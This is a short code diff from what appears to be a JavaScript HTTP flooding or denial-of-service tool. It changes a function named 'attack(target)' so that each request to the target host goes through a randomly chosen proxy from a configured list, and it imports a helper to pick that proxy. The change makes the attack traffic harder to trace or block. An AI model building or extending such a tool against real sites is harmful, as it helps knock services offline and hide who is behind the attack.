@@ -3,7 +3,7 @@ const { ASCIIAlphabet } = require('./constants');
 const { request } = require('./http');
 const { createWriteStream } = require('fs');
 const { join } = require('path');
-const { randomString, randomInt } = require('./random');
+const { randomString, randomInt, randomItem } = require('./random');
 
 function randomQueryString() {
     const key = randomString(ASCIIAlphabet, 2 + randomInt(8))
@@ -45,7 +45,8 @@ async function attack(target) {
         const promise = request({
             // url: `${config.onlyProtocol}//${target.host}/?${queryString}`,
             url: `${config.onlyProtocol}//${target.host}/`,
-            timeout: config.timeout
+            timeout: config.timeout,
+            proxy: randomItem(config.proxies)
         })
         const res = await promise
         statusCode = res.status || 0
